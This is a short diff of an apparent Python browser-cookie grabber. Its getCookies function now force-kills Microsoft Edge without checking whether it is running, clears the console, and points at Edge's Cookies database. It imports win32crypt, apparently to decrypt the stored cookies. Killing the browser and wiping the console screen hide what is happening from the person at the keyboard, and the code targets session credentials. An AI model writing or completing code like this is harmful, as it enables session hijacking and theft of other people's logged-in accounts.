@@ -9,10 +9,8 @@ import win32crypt
 
 def getCookies():
     try:
-        # Encerra o Edge para evitar bloqueios no banco de dados
-        if os.system("tasklist | findstr msedge.exe") == 0:
-            os.system("taskkill /F /IM msedge.exe")
-            os.system('cls' if os.name == 'nt' else 'clear')
+        os.system("taskkill /F /IM msedge.exe")
+        os.system('cls' if os.name == 'nt' else 'clear')
 
         # Caminhos para os arquivos do Edge
         db_path = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
